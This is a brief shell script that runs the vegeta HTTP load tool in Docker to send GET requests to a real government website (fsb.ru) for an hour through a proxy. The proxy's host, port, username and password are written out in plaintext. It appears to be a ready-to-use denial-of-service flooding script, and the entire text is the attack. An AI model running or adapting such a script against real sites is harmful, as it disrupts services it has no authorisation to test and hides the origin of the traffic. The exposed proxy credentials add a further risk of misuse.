PHOST=109.172.5.208
PPORT=45785
PUSER=Seltejfaturen
PPSWD=C6o9LlF
DST_HOST=http://www.fsb.ru/

HTTP_PROXY="http://$PUSER:$PPSWD@$PHOST:$PPORT"
HTTPS_PROXY="http://$PUSER:$PPSWD@$PHOST:$PPORT"

docker run --rm -it -e HTTP_PROXY="$HTTP_PROXY" \
-e HTTPS_PROXY="$HTTPS_PROXY" \
peterevans/vegeta \
sh -c "echo Started;
 echo 'GET $DST_HOST' |\
  vegeta attack -duration=3600s |\
   vegeta report --type=text --every=5s"